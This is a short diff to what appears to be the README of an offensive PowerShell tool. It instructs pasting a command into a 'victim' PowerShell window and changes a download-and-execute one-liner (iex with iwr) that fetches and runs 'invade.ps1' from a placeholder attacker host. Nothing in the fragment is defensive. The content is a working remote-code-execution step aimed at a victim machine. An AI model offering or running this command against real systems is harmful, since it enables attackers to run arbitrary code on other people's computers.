@@ -15,5 +15,5 @@ Once the `serve` script is running, you can copy and paste the output
 into the victim powershell window.
 
 ```
-iex (iwr -UseBasicParsing http://<ip>:<port>/invade.ps1)
+iex (iwr -DisableKeepAlive -UseBasicParsing http://<ip>:<port>/invade.ps1)
 ```
